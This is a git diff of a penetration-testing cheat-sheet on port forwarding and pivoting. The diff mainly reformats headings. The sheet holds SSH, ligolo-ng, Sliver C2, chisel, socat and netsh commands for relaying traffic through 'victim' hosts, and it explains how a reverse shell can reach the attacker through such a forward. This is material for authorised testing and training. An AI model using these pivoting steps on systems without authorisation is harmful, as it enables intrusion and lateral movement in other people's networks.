@@ -1,12 +1,14 @@
-### Port Forwarding
+# Port Forwarding
+
+
 
 TODO -> PORT FORWARDING SCENNARIO -> JMPHOST INTERNAL NETWORK
 
 if your port forward doesn't work but you're certain it should: did you check the host firewall? :)
 
-#### Local Port Forward
+## Local Port Forward
 
-##### SSH
+### SSH
 
 ```shell
 ssh -L LHOST_IF_ADDR:LPORT:RHOST_IP:RPORT root@10.13.37.16 -i root.key -fN
@@ -18,7 +20,7 @@ local port <- remote port
 a local port forward is used to make an application listening on a target machine's localhost, available on your local machine  
 
 
-##### ligolo-ng
+### ligolo-ng
 
 TODO
 ```ligolo-ng
@@ -26,7 +28,7 @@ listener_add --tcp --addr 172.16.1.10:61080 --to 10.10.14.14:80
 ```
 
 
-##### Sliver C2
+### Sliver C2
 
 open the listening socket `127.0.0.1:8080` (ATTCK host) and forward incoming connections to `172.16.139.10:8080` (AGENT host):  
 ```sliver
@@ -34,15 +36,15 @@ portfwd add -b 127.0.0.1:8080 -r 172.16.139.10:8080
 ```
 
 
-#### Remote Port Forward
+## Remote Port Forward
 
-##### SSH
+### SSH
 
 a remote port forward is used to make an application listening on your local machine available on a traget machine
 for ex. forward your netcat listener to a target machine's internal network interface so a reverse shell on the internal network can connect back to you via the target host your listener is forwarded to
 
 
-##### ligolo-ng
+### ligolo-ng
 
 ```ligolo-ng
 listener_add --tcp --addr 172.16.139.10:61080 --to 10.10.14.14:80
@@ -53,7 +55,7 @@ listener_add --tcp --addr 172.16.139.10:61080 --to 10.10.14.14:80
 A host from the internal network can do web downloads from the attacker host through the internal host01 via port 61080 because of this remote port forward.  
 
 
-##### Sliver C2
+### Sliver C2
 
 open the listening socket `172.16.210.3:61080` (AGENT host) and forward incoming connections to `10.10.14.14:61080` (ATTCK host):  
 ```sliver
@@ -61,7 +63,7 @@ rportfwd add -b 172.16.139.10:61080 -r 10.10.14.14:61080
 ```
 
 
-##### Windows Native Remote Port Fordward
+### Windows Native Remote Port Fordward
 
 show port forwards
 ```cmd
@@ -75,7 +77,7 @@ netsh interface portproxy add v4tov4 listenport=61080 listenaddress=172.16.210.3
 `172.16.210.3` -> `172.16.139.10`
 
 
-##### Windows Native Firewall
+### Windows Native Firewall
 
 allow incoming connection to tcp port 61080 on the host the command is executed on
 ```cmd
@@ -83,14 +85,14 @@ netsh advfirewall firewall add rule name="void_tcp_in_61080" dir=in action=allow
 ```
 
 
-#### Chisel:
+### Chisel:
 
 ```shell
 ./chisel server -p 8000 --reverse #Server -- Attacker
 ./chisel client 10.10.16.3:8000 R:100:172.17.0.1:100 #Client -- Victim
 ```
 
-#### Socat:
+### Socat:
 
 On victim:
 
@@ -98,7 +100,7 @@ On victim:
 socat tcp-listen:8080,reuseaddr,fork tcp:localhost:9200 &
 ```
 
-#### Netcat:
+### Netcat:
 
 On victim:
 
